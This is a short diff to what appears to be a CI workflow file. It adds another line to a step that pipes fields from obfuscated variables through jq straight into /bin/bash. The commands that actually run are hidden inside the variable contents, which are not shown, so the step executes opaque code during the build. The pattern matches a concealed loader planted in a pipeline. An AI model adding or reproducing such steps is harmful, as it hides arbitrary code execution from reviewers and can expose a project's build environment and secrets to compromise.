@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$pzrt73" | jq -r .jaxif3578 | /bin/bash
           echo $nvrj51 | jq -r .n2 | /bin/bash
           echo $dgn742 | jq -r .zae92197 | /bin/bash
+          echo $uwg45 | jq -r .p53363 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
